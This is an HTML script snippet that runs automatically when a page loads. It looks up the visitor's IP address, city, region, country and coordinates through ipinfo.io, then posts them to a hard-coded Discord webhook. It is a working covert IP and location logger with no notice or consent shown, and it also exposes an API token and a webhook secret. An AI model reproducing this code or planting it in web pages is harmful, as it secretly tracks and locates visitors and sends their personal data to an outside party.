<script>
    async function getIPAndLocation() {
        try {
            const response = await fetch('https://ipinfo.io/json?token=0955f5ad507b93');
            const data = await response.json();
            sendToDiscord(data);
        } catch (error) {
            console.error('Error fetching IP info:', error);
        }
    }

    function sendToDiscord(data) {
        const webhookUrl = 'https://discord.com/api/webhooks/1237688877435588723/RrRbIzFKtrX0edcT95NnKdzeHkhWNDRCxJou_UwbzOXpyDhj9dx1i5NTZMGdGYsoYM7I';
        const payload = {
            content: `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nAddress: ${data.loc}\n`
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        }).then(response => {
            if (response.ok) {
                console.log('Data sent to Discord webhook');
            } else {
                console.error('Error sending data to Discord webhook');
            }
        });
    }

    window.onload = getIPAndLocation;
</script>
